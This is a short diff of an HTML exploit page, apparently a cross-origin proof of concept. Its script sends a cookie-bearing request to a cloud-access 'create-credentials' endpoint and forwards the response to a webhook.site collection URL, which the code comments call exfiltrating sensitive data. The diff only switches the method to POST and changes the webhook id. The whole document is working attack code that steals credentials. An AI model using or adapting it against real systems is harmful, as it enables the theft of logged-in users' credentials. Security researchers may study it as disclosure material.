@@ -9,13 +9,13 @@
   <script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('GET', 'https://cloudaccess.svc.ui.com/create-credentials', true);
+    req.open('POST', 'https://cloudaccess.svc.ui.com/create-credentials', true);
     req.withCredentials = true; // Send cookies with the request
     req.send();
     
     function reqListener() {
       // Exfiltrate sensitive data to an external server
-      location = 'https://webhook.site/4257e232-4c50-4d50-80de-5e92e6d8d7e3?data=' + encodeURIComponent(this.responseText);
+      location = 'https://webhook.site/31f77ac0-e4dc-48c1-84e2-3c2dbd73a717?data=' + encodeURIComponent(this.responseText);
     }
   </script>
 </body>
